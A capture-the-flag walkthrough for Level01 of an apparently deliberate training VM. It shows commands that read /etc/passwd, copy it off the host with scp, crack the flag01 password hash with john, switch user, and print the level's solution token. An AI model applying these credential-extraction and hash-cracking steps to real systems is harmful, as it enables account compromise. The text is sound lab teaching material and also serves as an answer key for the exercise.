# Level01

## Walkthrough

Using the same commands from the previous level, we don't find any clue on how to find the current flag.

After browsing the system directories for a while, a filename caught our attention: `/etc/passwd`.  

```Traditionally, the /etc/passwd file is used to keep track of every registered user that has access to a system.
The /etc/passwd file is a colon-separated file that contains the following information:
  - User name
  - Encrypted password
  - User ID number (UID)
  - User's group ID number (GID)
  - Full name of the user (GECOS)
  - User home directory
  - Login shell
```

By checking the content of this file, we notice that the line for the user `flag01` contains an entry for the password.

```bash
level01@SnowCrash:~$ cat /etc/passwd
# [...]
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
# [...]
```
Unfortunately, using this string as the flag doesn't work. But it still looks like a token that we could crack, with a tool like `john` maybe?

To analyze the file, we transfer it to our local machine using [SCP](https://en.wikipedia.org/wiki/Secure_copy_protocol), and pass it to the `john` executable.

```bash
host:~$ scp -P 4242 level02@localhost:/etc/passwd passwd
host:~$ john -show passwd
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```

```bash
level01@SnowCrash:~$ su flag01
Password: 
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
